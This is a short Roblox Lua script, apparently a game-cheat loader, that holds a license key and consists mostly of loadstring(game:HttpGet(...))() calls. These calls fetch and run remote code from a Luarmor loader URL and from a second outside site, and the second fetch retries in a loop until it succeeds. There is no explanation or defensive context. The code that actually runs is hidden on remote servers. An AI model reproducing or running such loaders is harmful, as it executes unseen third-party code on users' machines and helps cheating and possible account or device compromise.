script_key="xqImXRGIJbTKjNrfBjHmecAFzIgZTDiV";
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/a8255d759144bb6127c5b72221cce5cd.lua"))()

-- Script kamu di thread sendiri
task.spawn(function()
    while true do
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://siganteng.store/api/script/u/ft_OAxXqM8qa9PTZ0SBJeSopwBjn14u4lXWhe_4XeFccIg"))()
        end)
        if success then break end
        warn("Script Error: " .. tostring(err))
        task.wait(5)
    end
end)
